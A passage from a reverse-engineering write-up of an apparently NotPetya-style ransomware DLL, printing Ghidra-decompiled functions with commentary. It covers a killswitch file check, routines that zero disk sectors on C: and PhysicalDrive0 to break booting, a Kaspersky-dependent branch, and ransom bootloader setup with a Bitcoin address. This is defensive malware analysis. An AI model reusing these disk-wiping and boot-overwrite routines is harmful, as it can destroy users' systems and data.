      if (param_1[1].OwningThread < (HANDLE)param_1[1].RecursionCount) {
        dwBytes = 8;
        dwFlags = 8;
        hHeap = GetProcessHeap();
        lpMem = HeapAlloc(hHeap,dwFlags,dwBytes);
        *(LPVOID *)(&(param_1[1].DebugInfo)->Type + (int)param_1[1].OwningThread * 2) = lpMem;
        if (lpMem != (LPVOID)0x0) {
          dwBytes = param_1[1].LockCount;
          dwFlags = 8;
          hHeap = GetProcessHeap();
          lpMem = HeapAlloc(hHeap,dwFlags,dwBytes);
          **(LPVOID **)(&(param_1[1].DebugInfo)->Type + (int)param_1[1].OwningThread * 2) = lpMem;
          if (lpMem == (LPVOID)0x0) {
            lpMem = *(LPVOID *)(&(param_1[1].DebugInfo)->Type + (int)param_1[1].OwningThread * 2);
            dwFlags = 0;
            hHeap = GetProcessHeap();
            HeapFree(hHeap,dwFlags,lpMem);
          }
          else {
            *(undefined4 *)
             (*(int *)(&(param_1[1].DebugInfo)->Type + (int)param_1[1].OwningThread * 2) + 4) =
                 param_3;
            memcpy(**(void ***)(&(param_1[1].DebugInfo)->Type + (int)param_1[1].OwningThread * 2),
                   param_2,param_1[1].LockCount);
            param_1[1].OwningThread = (HANDLE)((int)param_1[1].OwningThread + 1);
            local_8 = 1;
          }
        }
      }
      else {
        dwBytes = param_1[1].RecursionCount * 4 + 0x3fc;
        lpMem_00 = param_1[1].DebugInfo;
        dwFlags = 8;
        hHeap = GetProcessHeap();
        lpMem_00 = (PRTL_CRITICAL_SECTION_DEBUG)HeapReAlloc(hHeap,dwFlags,lpMem_00,dwBytes);
        if (lpMem_00 != (PRTL_CRITICAL_SECTION_DEBUG)0x0) {
          param_1[1].DebugInfo = lpMem_00;
          param_1[1].RecursionCount = param_1[1].RecursionCount + 0xff;
          local_8 = FUN_10007298(param_1,param_2,param_3);
        }
      }
    }
    LeaveCriticalSection(param_1);
  }
  return local_8;
}
```

These calls continue for a few levels but it all just seems to be synchronization logic with no globals being modified and the input critical section is used but seems to be used only as a critical section to lock on. In effect this seems to suggest that `FUN_10006fc7` is just a lock and wait function. Meaning that we simply suspend the current thread for a bit. The final component function of the lock is below.

```cpp
int FUN_100071d6(undefined4 param_1,undefined4 *param_2){
  uint in_EAX;
  LPCRITICAL_SECTION unaff_ESI;
  uint uVar1;
  int local_8;
  
  local_8 = 0;
  if (unaff_ESI != (LPCRITICAL_SECTION)0x0) {
    EnterCriticalSection(unaff_ESI);
    uVar1 = in_EAX;
    if (in_EAX < (int)unaff_ESI[1].OwningThread + in_EAX) {
      do {
        local_8 = (*(code *)unaff_ESI[1].SpinCount)
                            (**(undefined4 **)
                               (&(unaff_ESI[1].DebugInfo)->Type +
                               (uVar1 % (uint)unaff_ESI[1].OwningThread) * 2),param_1,
                             unaff_ESI[1].LockCount);
        if (local_8 != 0) {
          if (param_2 != (undefined4 *)0x0) {
            *param_2 = *(undefined4 *)
                        (&(unaff_ESI[1].DebugInfo)->Type +
                        (uVar1 % (uint)unaff_ESI[1].OwningThread) * 2);
          }
          break;
        }
        uVar1 = uVar1 + 1;
      } while (uVar1 < (int)unaff_ESI[1].OwningThread + in_EAX);
    }
    LeaveCriticalSection(unaff_ESI);
  }
  return local_8;
}
```

To confirm our suspicions we look for references to any of the component functions. Turns out that all of them have multiple references all over the program, further enforcing the suspicious that this is a `suspend and wait` type of call. We will rename the functions to suggest this.

- `FUN_10006fc7` -> `possible_lock_and_wait_check_args` 
- `FUN_10007298` -> `possible_lock_and_wait`
- `FUN_100071d6` -> `possible_lock`

We are sure to encounter them all again later, but for now we leave it at this and move on to the handling of colon command line arguments.

### FUN_10006de0 (handle_colon_arg)

```cpp
DWORD handle_colon_arg(short *param_1,short *param_2,undefined4 param_3){
  short sVar1;
  LPCRITICAL_SECTION p_Var2;
  HANDLE hHeap;
  short *psVar3;
  DWORD dwFlags;
  SIZE_T dwBytes;
  LPVOID lpMem;
  LPVOID local_10;
  LPVOID local_c;
  DWORD local_8;
  
  p_Var2 = critical_section_with_extra_debug;
  local_8 = 0;
  psVar3 = param_1;
  do {
    sVar1 = *psVar3;
    psVar3 = psVar3 + 1;
  } while (sVar1 != 0);
  dwBytes = ((int)((int)psVar3 - (int)(param_1 + 1)) >> 1) * 2 + 2;
  dwFlags = 8;
  hHeap = GetProcessHeap();
  local_10 = HeapAlloc(hHeap,dwFlags,dwBytes);
  if (local_10 != (LPVOID)0x0) {
    psVar3 = param_1;
    do {
      sVar1 = *psVar3;
      psVar3 = psVar3 + 1;
    } while (sVar1 != 0);
    memcpy(local_10,param_1,((int)((int)psVar3 - (int)(param_1 + 1)) >> 1) * 2 + 2);
    psVar3 = param_2;
    do {
      sVar1 = *psVar3;
      psVar3 = psVar3 + 1;
    } while (sVar1 != 0);
    dwBytes = ((int)((int)psVar3 - (int)(param_2 + 1)) >> 1) * 2 + 2;
    dwFlags = 8;
    hHeap = GetProcessHeap();
    local_c = HeapAlloc(hHeap,dwFlags,dwBytes);
    if (local_c != (LPVOID)0x0) {
      psVar3 = param_2;
      do {
        sVar1 = *psVar3;
        psVar3 = psVar3 + 1;
      } while (sVar1 != 0);
      memcpy(local_c,param_2,((int)((int)psVar3 - (int)(param_2 + 1)) >> 1) * 2 + 2);
      dwFlags = possible_lock_and_wait(p_Var2,&local_10,param_3);
      if (dwFlags != 0) {
        return dwFlags;
      }
      lpMem = local_c;
      local_8 = dwFlags;
      hHeap = GetProcessHeap();
      HeapFree(hHeap,dwFlags,lpMem);
    }
    dwFlags = 0;
    lpMem = local_10;
    hHeap = GetProcessHeap();
    HeapFree(hHeap,dwFlags,lpMem);
  }
  return local_8;
}
```

The general setup of this function looks straight forward. First the length of the argument is determined. Next enough heap memory is allocated to copy the argument into. The same happens for the argument length that was passed. At the end of the function we see both of these allocated heap regions being freed again. The only thing that happens in between is that a call is made to `possible_lock_and_wait` which we named earlier. The data passed here is the global `critical_section_with_extra_debug`, allocated memory with the copied passed argument and `param_3` which we know is `1` from the function call. It might be that `possible_lock_and_wait` does more than we think it does. Besides this the function returns the return value of the `possible_lock_and_wait` call or `local_8` if the call returned `0`. We know that the return value of this function is not used by the calling function, however, Ghidra tells us that there are 3 references to this function so perhaps it is used from a different location.

This wraps up the investigation of the command line argument parsing, however a lot is still very unclear. For now we move back to `Ordinal_1` however.

### Ordinal_1 (again)

Directly after handling the command line argument we see the following statement.

```cpp
if ((granted_privileges & 2) != 0) {
  FUN_1000835e();
  FUN_10008d5a();
}
```

Referring back to our earlier notes we see that a value of `2` here indicates the `SeDebugPrivilege`. From [a quick Google search](https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113) we note that this privilege is dangerous and effectively equivalent to administrator access as it allows the injection of code into any program that is running, including System owned processes.

Inside the if statement that is executed if this privilege is granted to the malware we see two subroutine calls. We start with the first one.

### FUN_1000835e

```cpp
uint FUN_1000835e(void){
  code *pcVar1;
  int iVar2;
  BOOL BVar3;
  HANDLE pvVar4;
  uint uVar5;
  WCHAR local_61c [780];
  
  uVar5 = 0;
  iVar2 = FUN_10008320(local_61c);
  if (iVar2 != 0) {
    BVar3 = PathFileExistsW(local_61c);
    if (BVar3 != 0) {
      ExitProcess(0);
      pcVar1 = (code *)swi(3);
      uVar5 = (*pcVar1)();
      return uVar5;
    }
    pvVar4 = CreateFileW(local_61c,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x4000000,(HANDLE)0x0);
    uVar5 = (uint)(pvVar4 != (HANDLE)0xffffffff);
  }
  return uVar5;
}
```

The function stars with a call to a different function called `FUN_10008320` presumable to obtain a file path as we see it being treated as such later. We also note that this file path is at most `780` characters long.

### FUN_10008320

```cpp
undefined4 FUN_10008320(LPWSTR param_1){
  LPWSTR pszFile;
  undefined4 uVar1;
  
  uVar1 = 0;
  pszFile = PathFindFileNameW(&dll_fully_qualified_path);
  pszFile = PathCombineW(param_1,L"C:\\Windows\\",pszFile);
  if (pszFile != (LPWSTR)0x0) {
    pszFile = PathFindExtensionW(param_1);
    if (pszFile != (LPWSTR)0x0) {
      *pszFile = L'\0';
      uVar1 = 1;
    }
  }
  return uVar1;
}
```

First we see a call to [PathFindFileNameW](https://docs.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-pathfindfilenamew) being used to obtain the file name of the malware from the `dll_fully_qualified_path` global. Next we see [PathCombineW](https://docs.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-pathcombinew) being used to combine `C:\Windows\` and the malware file name, the result is stored in the passed buffer `param_1`. Next we see a call being made to [PathFindExtensionW](https://docs.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-pathfindextensionw) to find the location of the path extension dot `.`. If found this dot is replaced by a `NUL` effectively terminating the string. At this point the function also returns true. We'll rename the function to `get_malware_c_windows_file_path`.

### Back in FUN_1000835e (killswitch)

We see that this function continues if a path for the malware in `C:\Windows\` was succesfully constructed. Next we see [PathFileExistsW](https://docs.microsoft.com/en-us/windows/win32/api/shlwapi/nf-shlwapi-pathfileexistsw) being used to check if a file already exists at the constructed path.

**If such a file exists already, [ExitProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess) is invoked terminating the malware and all its threads.**

If the file did not exist yet then it is created and the success value of this call is the return value of the function. We rename the function to `create_c_windows_file_or_exit`

Next we move on to the second function inside the if statement in `Oridinal_1`.

### FUN_10008d5a

```cpp
void FUN_10008d5a(void){
  HANDLE hDevice;
  BOOL BVar1;
  HLOCAL lpBuffer;
  int iVar2;
  DWORD local_24;
  undefined local_20 [20];
  DWORD local_c;
  
  hDevice = CreateFileA("\\\\.\\C:",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hDevice != (HANDLE)0x0) {
    BVar1 = DeviceIoControl(hDevice,0x70000,(LPVOID)0x0,0,local_20,0x18,&local_24,(LPOVERLAPPED)0x0)
    ;
    if ((BVar1 != 0) && (lpBuffer = LocalAlloc(0,local_c * 10), lpBuffer != (HLOCAL)0x0)) {
      SetFilePointer(hDevice,local_c,(PLONG)0x0,0);
      WriteFile(hDevice,lpBuffer,local_c,&local_24,(LPOVERLAPPED)0x0);
      LocalFree(lpBuffer);
    }
    CloseHandle(hDevice);
  }
  if (((detected_anti_virus & 8) != 0) && (iVar2 = FUN_100014a9(), iVar2 == 0)) {
    return;
  }
  FUN_10008cbf();
  return;
}
```

The first thing we see in this function is that `C:` drive is opened as a file with `0x40000000` meaning `GENERIC_WRITE`. If this handle was succesfully obtained a call is made to [DeviceIoControl](https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol), this function directly sends a control code to the specified device driver. In this case we see that the control code being sent is `0x70000`. We [figure out](http://www.ioctls.net/) that this means [IOCTL_DISK_GET_DRIVE_GEOMETRY](https://docs.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-ioctl_disk_get_drive_geometry). As per the MSDN docs this returns:

> Retrieves information about the physical disk's geometry: type, number of cylinders, tracks per cylinder, sectors per track, and bytes per sector.

The result of this call is stored in `local_20` and the total number of returned bytes is stored in `local_24`. Next we see a buffer being allocated for `10 * local_c` bytes and with the `0` flags which means `LMEM_FIXED` here. This variable however does not have a value as far as we can tell. This might be because `local_24`, `local_20` and `local_c` are supposed to represent the same structure but were not recognized as such by Ghidra as `local_20` has an undefined type.

Next we see a call to [SetFilePointer](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfilepointer). This subroutine call moves the given file pointer, the distance to move by is `local_c`.

We now realize something. `DeviceIoControl` was called with buffer `local_20`, this buffer has size `20` but is indicated to have size `0x18` which is `24`. A `DWORD` however has `4` bytes. This means that `local_20` and `local_c` most likely refer to the same memory block. However `local_c` got singled out due to being used as a `DWORD` later on. All in all this means that `local_c` contains the last `DWORD` returned by `IOCTL_DISK_GET_DRIVE_GEOMETRY IOCTL`. Some more searching reveals the type of `local_20` and `local_c` this being the [DISK_GEOMETRY](https://docs.microsoft.com/en-us/windows/win32/api/winioctl/ns-winioctl-disk_geometry) structure. Retyping the local variables massively cleans up the decompilation.

```cpp
void FUN_10008d5a(void){
  HANDLE hDevice;
  BOOL BVar1;
  HLOCAL lpBuffer;
  int iVar2;
  DWORD geo_size;
  DISK_GEOMETRY local_20;
  
  hDevice = CreateFileA("\\\\.\\C:",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hDevice != (HANDLE)0x0) {
    BVar1 = DeviceIoControl(hDevice,0x70000,(LPVOID)0x0,0,&local_20,0x18,&geo_size,(LPOVERLAPPED)0x0
                           );
    if ((BVar1 != 0) &&
       (lpBuffer = LocalAlloc(0,local_20.BytesPerSector * 10), lpBuffer != (HLOCAL)0x0)) {
      SetFilePointer(hDevice,local_20.BytesPerSector,(PLONG)0x0,0);
      WriteFile(hDevice,lpBuffer,local_20.BytesPerSector,&geo_size,(LPOVERLAPPED)0x0);
      LocalFree(lpBuffer);
    }
    CloseHandle(hDevice);
  }
  if (((detected_anti_virus & 8) != 0) && (iVar2 = FUN_100014a9(), iVar2 == 0)) {
    return;
  }
  FUN_10008cbf();
  return;
}
```

It now becomes clear that the allocated buffer is for `10` disk sectors and that the pointer offset is the number of bytes per sector.

The next thing we see is a [WriteFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile) invocation. Assuming that the allocated buffer is initialised to all zeroes then this call completely zeroes out the 2nd sector on the `C:` drive. It makes sense that the first disk sector is skipped as this is always the location of the [MBR](http://www.ntfs.com/mbr.htm) (Master Boot Record). On a NTFS partitioned volume however the first `16` sectors are used for `$Boot` metadata. In fact the other `15` sectors are used for the [IPL](http://www.ntfs.com/ntfs-partition-boot-sector.htm). The IPL is the very first program that is loaded when a computer is powered on and normally loads the operating system. However, in our case the first sector this program is stored on just got zeroed out completely. A computer this happens with likely won't be booting anymore.

Near the end of the subroutine we see an if statement that checks for the detected precense of anti virus software `8`, we know that this indicates the 4th bit which is flipped to `0` by the presence of Kaspersky. If Kaspersky is not detected and a function called `FUN_100014a9` returns `0` then the function is short circuited. Otherwise a function called `FUN_10008cbf` is also executed before returning.

A quick look ahead reveals that `FUN_100014a9` is huge and might coordinate the file encryption. Therefore we first take a look at `FUN_10008cbf`.

### FUN_10008cbf

```cpp
undefined4 FUN_10008cbf(void){
  HANDLE hDevice;
  undefined4 uVar1;
  undefined local_24 [20];
  int local_10;
  HLOCAL local_c;
  DWORD local_8;
  
  hDevice = CreateFileA("\\\\.\\PhysicalDrive0",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                        (HANDLE)0x0);
  if (hDevice == (HANDLE)0x0) {
    uVar1 = 0;
  }
  else {
    DeviceIoControl(hDevice,0x70000,(LPVOID)0x0,0,local_24,0x18,&local_8,(LPOVERLAPPED)0x0);
    local_c = LocalAlloc(0,local_10 * 10);
    if (local_c != (HLOCAL)0x0) {
      DeviceIoControl(hDevice,0x90020,(LPVOID)0x0,0,(LPVOID)0x0,0,&local_8,(LPOVERLAPPED)0x0);
      WriteFile(hDevice,local_c,local_10 * 10,&local_8,(LPOVERLAPPED)0x0);
      LocalFree(local_c);
    }
    CloseHandle(hDevice);
    uVar1 = 1;
  }
  return uVar1;
}
```

This subroutine looks very similar to the one we just analyzed. Except here `PhysicalDrive0` is opened. A similar buffer of `10 * BytesPerSector` is also allocated. However after this we see a second `DeviceIoControl` call with a flag of `0x90020` which is new. Turns out that this maps to [FSCTL_DISMOUNT_VOLUME](https://docs.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-fsctl_dismount_volume) this call dismounts a volume regardless of whether or not it is in use. Next we see a write to the physical volume where the first `10` sectors are completely zeroed out. Whereas perviously we just zeroed out the 2nd sector. Now we zero out the first `10`. This is effectively a more severe version of the earlier subroutine. Presumable this subroutine fails when Kaspersky is installed which is why an alternative is in place and this function only executed when Kaspersky is not present.

Next we move on to `FUN_100014a9` which is presumably in control of some rather important logic.

### FUN_100014a9

```cpp
void FUN_100014a9(void){
  uint *puVar1;
  uint *puVar2;
  char cVar3;
  char *_Size;
  uint *puVar4;
  DWORD DVar5;
  uint uVar6;
  uint *puVar7;
  uint uVar8;
  undefined4 *puVar9;
  undefined4 *puVar10;
  int iVar11;
  undefined4 *puVar12;
  undefined local_99c;
  undefined local_99b [511];
  undefined4 local_79c [128];
  undefined4 local_59c [110];
  undefined4 local_3e4;
  undefined2 local_3e0;
  uint local_3de [16];
  undefined local_39c;
  BYTE local_39b [32];
  BYTE local_37b [8];
  undefined local_373 [34];
  undefined local_351;
  undefined local_2f3 [343];
  CHAR local_19c;
  undefined local_19b [267];
  byte local_90 [60];
  char local_54 [64];
  uint local_14;
  uint local_10;
  undefined4 *local_c;
  void *local_8;
  
  local_19c = '\0';
  memset(local_19b,0,0x103);
  local_59c[0]._0_1_ = 0;
  memset((void *)((int)local_59c + 1),0,0x1ff);
  local_39c = 0;
  memset(local_39b,0,0x1ff);
  local_99c = 0;
  memset(local_99b,0,0x1ff);
  local_79c[0]._0_1_ = 0;
  memset((void *)((int)local_79c + 1),0,0x1ff);
  local_90[0] = 0;
  memset(local_90 + 1,0,0x3b);
  local_54[0] = '\0';
  memset(local_54 + 1,0,0x3c);
  local_10 = 0;
  DAT_1001f8f8 = FUN_10001038(&local_19c);
  if ((-1 < (int)DAT_1001f8f8) &&
     (DAT_1001f8f8 = FUN_1000122d(&local_19c,&local_8), -1 < (int)DAT_1001f8f8)) {
    if (local_8 == (void *)0x0) {
      DAT_1001f8f8 = FUN_10001424(local_90,0x3c);
      if (-1 < (int)DAT_1001f8f8) {
        uVar8 = 0;
        do {
          uVar6 = uVar8 + 1;
          local_54[uVar8] =
               "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
               [(uint)local_90[uVar8] % 0x3a];
          uVar8 = uVar6;
        } while (uVar6 < 0x3c);
        DAT_1001f8f8 = FUN_100012d5(&local_19c,local_59c);
        if (-1 < (int)DAT_1001f8f8) {
          puVar4 = local_3de + 2;
          iVar11 = 4;
          uVar8 = 0;
          do {
            uVar6 = *puVar4;
            if ((uVar6 != 0) && (uVar6 != 0xffffffff)) {
              uVar8 = uVar6;
            }
            puVar4 = puVar4 + 4;
            iVar11 = iVar11 + -1;
          } while (iVar11 != 0);
          if (uVar8 == 0xffffffff) {
            uVar8 = 0;
          }
          if (uVar8 < 0x29) {
            DAT_1001f8f8 = 0x80070272;
          }
          else {
            iVar11 = 0x80;
            puVar9 = (undefined4 *)local_59c;
            puVar10 = local_79c;
            while (iVar11 != 0) {
              iVar11 = iVar11 + -1;
              *puVar10 = *puVar9;
              puVar9 = puVar9 + 1;
              puVar10 = puVar10 + 1;
            }
            uVar8 = 0;
            do {
              *(byte *)((int)local_79c + uVar8) = *(byte *)((int)local_79c + uVar8) ^ 7;
              uVar8 = uVar8 + 1;
            } while (uVar8 < 0x200);
            memset(&local_99c,7,0x200);
            local_39c = 0;
            DAT_1001f8f8 = FUN_10001424(local_39b,0x20);
            if ((-1 < (int)DAT_1001f8f8) &&
               (DAT_1001f8f8 = FUN_10001424(local_37b,8), -1 < (int)DAT_1001f8f8)) {
              memcpy(local_373,"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX",0x22);
              _Size = local_54;
              local_351 = 0;
              do {
                cVar3 = *_Size;
                _Size = _Size + 1;
              } while (cVar3 != '\0');
              _Size = _Size + -(int)(local_54 + 1);
              if (_Size != (char *)0x0) {
                if ((char *)0x156 < _Size) {
                  _Size = (char *)0x156;
                }
                memcpy(local_2f3,local_54,(size_t)_Size);
                local_2f3[(int)_Size] = 0;
              }
              local_c = (undefined4 *)(*_DAT_1001b104)(0x200);
              if (local_c == (undefined4 *)0x0) {
                DAT_1001f8f8 = 0x8007000e;
              }
              else {
                iVar11 = 0x80;
                puVar9 = &DAT_10018c50;
                puVar10 = local_c;
                while (iVar11 != 0) {
                  iVar11 = iVar11 + -1;
                  *puVar10 = *puVar9;
                  puVar9 = puVar9 + 1;
                  puVar10 = puVar10 + 1;
                }
                DAT_1001f8f8 = 0;
              }
              if (-1 < (int)DAT_1001f8f8) {
                local_8 = (void *)(*_DAT_1001b104)(0x22b1);
                if (local_8 == (void *)0x0) {
                  DAT_1001f8f8 = 0x8007000e;
                }
                else {
                  local_10 = 0x22b1;
                  memcpy(local_8,&DAT_10018e50,0x22b1);
                  DAT_1001f8f8 = 0;
                }
                if (-1 < (int)DAT_1001f8f8) {
                  local_14 = (local_10 - (local_10 & 0x1ff)) + 0x400;
                  puVar9 = (undefined4 *)(*_DAT_1001b104)(local_14);
                  if (puVar9 == (undefined4 *)0x0) {
                    DAT_1001f8f8 = 0x8007000e;
                  }
                  else {
                    iVar11 = 0x80;
                    puVar10 = local_c;
                    puVar12 = puVar9;
                    while (iVar11 != 0) {
                      iVar11 = iVar11 + -1;
                      *puVar12 = *puVar10;
                      puVar10 = puVar10 + 1;
                      puVar12 = puVar12 + 1;
                    }
                    puVar9[0x6e] = local_3e4;
                    *(undefined2 *)(puVar9 + 0x6f) = local_3e0;
                    puVar4 = local_3de;
                    puVar7 = (uint *)((int)puVar9 + 0x1be);
                    iVar11 = 4;
                    do {
                      *puVar7 = *puVar4;
                      puVar7[1] = puVar4[1];
                      puVar2 = puVar7 + 3;
                      puVar1 = puVar4 + 3;
                      puVar7[2] = puVar4[2];
                      puVar4 = puVar4 + 4;
                      puVar7 = puVar7 + 4;
                      iVar11 = iVar11 + -1;
                      *puVar2 = *puVar1;
                    } while (iVar11 != 0);
                    memcpy(puVar9 + 0x80,local_8,local_10);
                    uVar8 = local_14 >> 9;
                    DVar5 = 0;
                    if (uVar8 == 0) {
                      DVar5 = 0x80070057;
                    }
                    else {
                      uVar6 = 0;
                      if (uVar8 != 0) {
                        do {
                          DVar5 = FUN_10001384(&local_19c,puVar9);
                          if ((int)DVar5 < 0) break;
                          uVar6 = uVar6 + 1;
                          puVar9 = puVar9 + 0x80;
                        } while (uVar6 < uVar8);
                      }
                    }
                    DAT_1001f8f8 = DVar5;
                    if (((-1 < (int)DVar5) &&
                        (DAT_1001f8f8 = FUN_10001384(&local_19c,&local_39c), -1 < (int)DAT_1001f8f8)
                        ) && (DAT_1001f8f8 = FUN_10001384(&local_19c,&local_99c),
                             -1 < (int)DAT_1001f8f8)) {
                      DAT_1001f8f8 = FUN_10001384(&local_19c,local_79c);
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    else {
      DAT_1001f8f8 = 0x80070032;
    }
  }
  return;
}
```

The first thing to note is the large number of undefined structures. Hopefully we will be able to retype some of these since they cover well over 1000 bytes combined. From a quick look at the function body we can see that this subroutine probably coordinates the encryption and demand screen. We can also see the bitcoin payment address and something that looks like the AES key generation.

First in the function we see a lot of metsets populating arrays. The important thing to note is that the memsets fill a longer range than what Ghidra has allocated for them.

After the we see `local_19c` being passed to `FUN_10001038`.

### FUN_10001038

```cpp
DWORD FUN_10001038(char *param_1){
  char cVar1;
  UINT UVar2;
  DWORD DVar3;
  BOOL BVar4;
  char *pcVar5;
  char *pcVar6;
  int iVar7;
  int *piVar8;
  undefined4 *_Size;
  byte local_270;
  undefined local_26f [263];
  uint local_168;
  undefined4 uStack356;
  undefined4 uStack352;
  undefined4 uStack348;
  char cStack344;
  undefined local_157;
  undefined4 local_60 [2];
  int local_58 [6];
  char local_40;
  undefined4 local_3f;
  DWORD local_20;
  HANDLE local_1c;
  char *local_18;
  DWORD local_14;
  undefined4 local_10;
  ushort local_c;
  undefined local_a;
  
  local_14 = 0;
  local_270 = 0;
  memset(local_26f,0,0x103);
  local_168 = local_168 & 0xffffff00;
  memset((void *)((int)&local_168 + 1),0,0x103);
  iVar7 = 6;
  local_60[0] = 0;
  piVar8 = local_58;
  while (iVar7 != 0) {
    iVar7 = iVar7 + -1;
    *piVar8 = 0;
    piVar8 = piVar8 + 1;
  }
  local_40 = '\0';
  iVar7 = 7;
  _Size = &local_3f;
  while (iVar7 != 0) {
    iVar7 = iVar7 + -1;
    *_Size = 0;
    _Size = _Size + 1;
  }
  *(undefined2 *)_Size = 0;
  local_10 = 0x5c2e5c5c;
  local_c = 0x3a30;
  local_a = 0;
  local_20 = 0;
  *(undefined *)((int)_Size + 2) = 0;
  if (param_1 == (char *)0x0) {
    DVar3 = 0xa0;
  }
  else {
    memset(param_1,0,0x104);
    local_168 = 0x5c2e5c5c;
    uStack356 = 0x73796850;
    uStack352 = 0x6c616369;
    uStack348 = 0x76697244;
    cStack344 = 'e';
    local_157 = 0;
    UVar2 = GetSystemDirectoryA((LPSTR)&local_270,0x104);
    if (UVar2 != 0) {
      local_c = local_c & 0xff00 | (ushort)local_270;
      local_1c = CreateFileA((LPCSTR)&local_10,0,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
      if (local_1c != (HANDLE)0xffffffff) {
        BVar4 = DeviceIoControl(local_1c,0x560000,(LPVOID)0x0,0,local_60,0x20,&local_20,
                                (LPOVERLAPPED)0x0);
        if (BVar4 == 0) {
          local_14 = GetLastError();
          if (0 < (int)local_14) {
            local_14 = local_14 & 0xffff | 0x80070000;
          }
        }
        else {
          _itoa(local_58[0],&local_40,10);
          _Size = &local_168;
          do {
            cVar1 = *(char *)_Size;
            _Size = (undefined4 *)((int)_Size + 1);
          } while (cVar1 != '\0');
          _Size = (undefined4 *)((int)_Size - ((int)&local_168 + 1));
          pcVar5 = &local_40;
          do {
            cVar1 = *pcVar5;
            pcVar5 = pcVar5 + 1;
          } while (cVar1 != '\0');
          pcVar5 = pcVar5 + -(int)&local_3f;
          local_18 = pcVar5;
          if (pcVar5 + 1 + (int)_Size < (char *)0x105) {
            if (_Size != (undefined4 *)0x0) {
              if ((undefined4 *)0x103 < _Size) {
                _Size = (undefined4 *)0x103;
              }
              memcpy(param_1,&local_168,(size_t)_Size);
              pcVar5 = local_18;
              *(undefined *)((int)_Size + (int)param_1) = 0;
            }
            pcVar6 = param_1;
            do {
              cVar1 = *pcVar6;
              pcVar6 = pcVar6 + 1;
            } while (cVar1 != '\0');
            pcVar6 = pcVar6 + -(int)(param_1 + 1);
            if ((pcVar5 != (char *)0x0) && (pcVar5 + (int)pcVar6 < (char *)0x104)) {
              memcpy(pcVar6 + (int)param_1,&local_40,(size_t)local_18);
              param_1[(int)(pcVar5 + (int)pcVar6)] = '\0';
            }
          }
          else {
            local_14 = 0x8007007a;
          }
        }
        CloseHandle(local_1c);
        return local_14;
      }
    }
    DVar3 = GetLastError();
    if (0 < (int)DVar3) {
      DVar3 = DVar3 & 0xffff | 0x80070000;
    }
  }
  return DVar3;
}
```

Surprisingly, this function is rather long too. After some initial setup we again see a familiar call to `CreateFileA` in combination with `DeviceIoControl`. We also see a call to `GetSystemDirectoryA` to get the system directory. However the passed `local_270` is defintely not the correct parameter to pass here. It is also indicated that a buffer of size `0x104` was supposed to be passed. Looking at the local variables it is likely that `local_26f` will store this path. The size however does not match up. Most likely the byte of `local_270` has to be joined to this range of memory freeing up 4 bytes for most likely a `DWORD` type or similar later on.

For the time being almost every thing that happens to the local variables is meaning less. So we'll first try to retype things using the Win API functions.

The `DeviceIoControl` function is called with control code `0x560000`. This maps to the [IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS](https://docs.microsoft.com/nl-nl/windows/win32/api/winioctl/ni-winioctl-ioctl_volume_get_volume_disk_extents?redirectedfrom=MSDN) constant. From this we gather that the output buffer `local_60` has to be of type [VOLUME_DISK_EXTENTS](https://docs.microsoft.com/nl-nl/windows/win32/api/winioctl/ns-winioctl-volume_disk_extents). After manually adding all the structures and retyping the locals the decompilation result clears up a bit.

This function is still fairly complicated however and hard to understand. For now we'll leave it be and try to figure out what the `param_1` is supposed to be first.

The important thing to note is that what is returned is an error (status) code. The function itself seems to heavily modify the input. We also see that in `FUN_100014a9` the global `DAT_1001f8f8` is often used to store this error code throughout the function, so lets rename it to `status_code`.

### FUN_1000122d

Next we take a look at `FUN_1000122d` which will hopefully lets us figure out the exact type of `local_8`

```cpp
DWORD FUN_1000122d(LPCSTR param_1,undefined4 *param_2){
  HANDLE hDevice;
  BOOL BVar1;
  DWORD DVar2;
  undefined4 local_9c [37];
  DWORD local_8;
  
  DVar2 = 0;
  local_8 = 0;
  if (param_1 == (LPCSTR)0x0) {
    DVar2 = 0x80070057;
  }
  else {
    hDevice = CreateFileA(param_1,0x80100000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
    if (hDevice == (HANDLE)0xffffffff) {
      DVar2 = GetLastError();
      if (0 < (int)DVar2) {
        DVar2 = DVar2 & 0xffff | 0x80070000;
      }
    }
    else {
      BVar1 = DeviceIoControl(hDevice,0x70048,(LPVOID)0x0,0,local_9c,0x90,&local_8,(LPOVERLAPPED)0x0
                             );
      if (BVar1 == 0) {
        DVar2 = GetLastError();
        if (0 < (int)DVar2) {
          DVar2 = DVar2 & 0xffff | 0x80070000;
        }
      }
      else {
        *param_2 = local_9c[0];
      }
      CloseHandle(hDevice);
    }
  }
  return DVar2;
}
```

The main thing to figure out in this function is the type of `local_9c`. `DeviceIoControl` in this function is called with control code `0x70048`. This represents the [IOCTL_DISK_GET_PARTITION_INFO_EX](https://docs.microsoft.com/nl-nl/windows/win32/api/winioctl/ni-winioctl-ioctl_disk_get_partition_info_ex?redirectedfrom=MSDN) constant. This allows us to retype `local_9c` giving.

```cpp
DWORD FUN_1000122d(LPCSTR param_1,undefined4 *param_2){
  HANDLE hDevice;
  BOOL BVar1;
  DWORD DVar2;
  PARTITION_INFORMATION_EX local_9c;
  DWORD local_8;
  
  DVar2 = 0;
  local_8 = 0;
  if (param_1 == (LPCSTR)0x0) {
    DVar2 = 0x80070057;
  }
